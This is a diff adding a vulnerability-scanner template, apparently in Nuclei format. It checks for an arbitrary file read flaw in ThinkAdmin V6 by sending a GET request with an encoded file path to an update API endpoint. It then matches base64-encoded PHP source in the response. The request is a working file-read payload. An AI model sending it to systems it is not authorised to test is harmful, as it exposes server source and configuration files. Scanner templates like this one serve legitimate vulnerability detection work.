@@ -1,0 +1,27 @@
+id: thinkadmin-v6-readfile
+info:
+  name: Thinkadmin V6 Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: file-read
+  description: |
+    Thinkadmin V6 File Read Vulnerability allows attackers to exploit a specific endpoint to read arbitrary files on the server.
+http:
+  - method: GET
+    path:
+      - "/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b2x322s2t3c1a342w34"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "content-type"
+          - "json"
+      - type: word
+        part: body
+        words:
+          - "PD9waH"
+          - "VGhpbmtBZG1pbg"
